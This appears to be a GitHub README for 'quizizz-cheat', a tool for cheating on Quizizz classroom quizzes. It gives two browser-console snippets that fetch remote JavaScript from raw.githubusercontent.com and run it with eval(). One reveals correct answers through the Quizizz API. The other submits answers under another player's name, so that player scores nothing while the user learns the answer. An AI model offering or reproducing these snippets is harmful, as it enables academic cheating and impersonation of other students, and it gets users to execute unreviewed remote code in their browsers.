quizizz-cheat

There are two method of retrieving answers

Fetching Quizizz API
Sending answers as someone else(old method)



Methods

Fetching Quizizz API

Should work in Test and Classic mode.

Join Quiz
Open console and paste this
fetch("https://raw.githubusercontent.com/gbaranski/quizizz-cheat/master/dist/bundle.js")
.then((res) => res.text()
.then((t) => eval(t)))

You can now close console, recognize good answers by background opacity of answer block.

Sending answers as someone else

This works in different way, instead of fetching Quizizz API it sends answer to current question as someone else, Quizizz returns valid answer in response to submission.

Join quiz, wait for first question and open console
Paste this code to console

fetch("https://raw.githubusercontent.com/gbaranski/quizizz-cheat/oldmethod/dist/bundle.js")
.then((res) => res.text()
.then((t) => eval(t)))

Enter user name of any player(he won't get points even if he sent valid answer).

Go to step 2
As we can see on this screenshot, anwser www.quizizz.com has highest opacity, that means its valid
![image](https://user-images.githubusercontent.com/81293179/112279944-c1354e80-8c84-11eb-95ea-2452b825d8e8.png)
